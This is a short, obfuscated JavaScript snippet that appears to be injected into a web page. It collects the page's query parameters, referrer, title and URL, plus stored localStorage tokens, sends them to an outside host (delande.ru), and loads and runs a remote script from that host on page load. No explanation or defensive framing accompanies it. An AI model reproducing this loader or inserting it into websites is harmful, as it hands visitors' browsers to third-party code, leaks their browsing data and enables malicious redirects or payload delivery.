var name = '_8NS7nKhsQNd8ftbP';
    if (!window._8NS7nKhsQNd8ftbP) {
        window._8NS7nKhsQNd8ftbP = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://delande.ru/5By6K1',
        };
    }
    const _tmKkr2g9CY19RtW5 = localStorage.getItem('config');
    if (typeof _tmKkr2g9CY19RtW5 !== 'undefined' && _tmKkr2g9CY19RtW5 !== null) {
        var _q7XC4B2WYCmBmCjZ = JSON.parse(_tmKkr2g9CY19RtW5);
        var _rR3Y3NCRLggB4KVT = Math.round(+new Date()/1000);
        if (_q7XC4B2WYCmBmCjZ.created_at + window._8NS7nKhsQNd8ftbP.ttl < _rR3Y3NCRLggB4KVT) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _BDmXhSxRBsyLt9M7 = localStorage.getItem('subId');
    var _bMC7NpT5BKhrPMY9 = localStorage.getItem('token');
    var _FSqRn9cbYdRJzN2H = '?return=js.client';
        _FSqRn9cbYdRJzN2H += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _FSqRn9cbYdRJzN2H += '&se_referrer=' + encodeURIComponent(document.referrer);
        _FSqRn9cbYdRJzN2H += '&default_keyword=' + encodeURIComponent(document.title);
        _FSqRn9cbYdRJzN2H += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _FSqRn9cbYdRJzN2H += '&name=' + encodeURIComponent(name);
        _FSqRn9cbYdRJzN2H += '&host=' + encodeURIComponent(window._8NS7nKhsQNd8ftbP.R_PATH);
    if (typeof _BDmXhSxRBsyLt9M7 !== 'undefined' && _BDmXhSxRBsyLt9M7 && window._8NS7nKhsQNd8ftbP.unique) {
        _FSqRn9cbYdRJzN2H += '&sub_id=' + encodeURIComponent(_BDmXhSxRBsyLt9M7);
    }
    if (typeof _bMC7NpT5BKhrPMY9 !== 'undefined' && _bMC7NpT5BKhrPMY9 && window._8NS7nKhsQNd8ftbP.unique) {
        _FSqRn9cbYdRJzN2H += '&token=' + encodeURIComponent(_bMC7NpT5BKhrPMY9);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._8NS7nKhsQNd8ftbP.R_PATH + _FSqRn9cbYdRJzN2H;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
